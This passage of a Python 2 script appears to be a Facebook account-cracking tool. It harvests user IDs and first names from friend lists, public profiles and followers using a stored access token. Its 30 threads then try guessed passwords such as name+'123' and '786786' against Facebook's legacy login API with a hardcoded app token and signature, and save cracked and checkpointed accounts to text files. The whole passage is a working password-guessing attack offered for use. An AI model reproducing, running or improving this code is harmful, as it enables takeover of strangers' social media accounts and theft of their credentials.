                            print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass4 + '\x1b[1;91m | \x1b[1;97m' + name
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                        else:
                            pass5 = '786786'
                            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass5 + '\x1b[1;91m | \x1b[1;97m' + name
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                            else:
                                pass6 = '654321'
                                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass6 + '\x1b[1;91m | \x1b[1;97m' + name
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    pass7 = '098765'
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass7 + '\x1b[1;91m | \x1b[1;97m' + name
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;32m--------------------------------------------------'
    print '\x1b[1;32m[+]\x1b[1;32m Process Has Been Completed'
    print '\x1b[1;32m[+]\x1b[1;32m Total CP/OK:\x1b[0;32m  ' + str(len(cps)) + '/\x1b[1;32m ' + str(len(oks))
    print '\x1b[1;32m--------------------------------------------------'
    raw_input('Press Enter To Main Menu Back')
    menu()


def indiaa():
    global token
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print '[!] Error 404 . Token Not Found'
        os.system('rm -rf .login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    os.system('python3 .loading.md')
    os.system('clear')
    print logo
    print '\t   India Menu'
    print '\x1b[1;32m--------------------------------------------------'
    print '\x1b[1;32m[1]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;3mCrack From Friend List'
    print '\x1b[1;32m[2]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;3mCrack From Public ID'
    print '\x1b[1;32m[3]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;3mCrack From Followers'
    print '\x1b[1;32m[0]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;3mBack'
    print '\x1b[1;32m--------------------------------------------------'
    indiaa2()


def indiaa2():
    select = raw_input('\n\xe2\x95\xb0\xe2\x94\x80\xe2\x9e\xa3 ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print '\t\x1b[1;32m  Clone From Frienlist\x1b[1;3m'
        print '\x1b[1;32m--------------------------------------------------'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for s in z['data']:
            uid = s['id']
            na = s['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print '\t\x1b[1;32m  Clone From Public ID\x1b[1;32m'
        print '\x1b[1;32m--------------------------------------------------'
        idt = raw_input('\x1b[1;32m[+]\x1b[1;32m Input ID/Username :\x1b[1;32m ')
        print '\x1b[1;32m--------------------------------------------------'
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print '[\xe2\x9c\x93] Account Name : ' + q['name']
        except KeyError:
            print '\n[!] Error 404 . ID Link ' + idt + ' Have Privacy On Friendlist OR IS Not Valid'
            raw_input('\nPress Enter To Back ')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '3':
        os.system('clear')
        print logo
        print '\t\x1b[1;32m  Clone From Followers\x1b[1:32m'
        print '\x1b[1;32m--------------------------------------------------'
        idt = raw_input('\x1b[1;32m[+]\x1b[1;3m Input ID/Username :\x1b[1;32m ')
        print '\x1b[1;32m--------------------------------------------------'
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print '[\xe2\x9c\x93] Account Name : ' + q['name']
        except KeyError:
            print '\n[!] Error 404 . ID Link ' + idt + ' Donot Have Followers OR IS Not Valid'
            raw_input('\nPress Enter To Back ')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print '[!] Please Select a Valid Option'
        indiaa2()
    print '\x1b[1;32m[+]\x1b[1;32m Total IDs :\x1b[1;32m ' + str(len(id))
    print '\x1b[1;32m[+]\x1b[1;32m Please Wait------------Rishu On Fire\x1b[1;3m'
    print '\x1b[1;32m--------------------------------------------------'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name + '123'
            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
            d = json.loads(q)
            if 'www.facebook.com' in d['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass1 + '\x1b[1;91m | \x1b[1;97m' + name
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
            else:
                pass2 = name + '1234'
                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass2 + '\x1b[1;91m | \x1b[1;97m' + name
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                else:
                    pass3 = name + '12345'
                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass3 + '\x1b[1;91m | \x1b[1;97m' + name
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                    else:
                        pass4 = name + '098'
                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass4 + '\x1b[1;91m | \x1b[1;97m' + name
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                        else:
                            pass5 = '556677'
                            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass5 + '\x1b[1;91m | \x1b[1;97m' + name
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                            else:
                                pass6 = '334455'
                                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass6 + '\x1b[1;91m | \x1b[1;97m' + name
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    pass7 = '334455'
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass7 + '\x1b[1;91m | \x1b[1;97m' + name
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;32m--------------------------------------------------'
    print '\x1b[1;32m[+]\x1b[1;32m Process Has Been Completed'
    print '\x1b[1;32m[+]\x1b[1;32m Total CP/OK:\x1b[0;32m  ' + str(len(cps)) + '/\x1b[1;32m ' + str(len(oks))
    print '\x1b[1;32m--------------------------------------------------'
    raw_input('Press Enter To Main Menu Back')
    menu()


if __name__ == '__main__':
    tech_abm() 


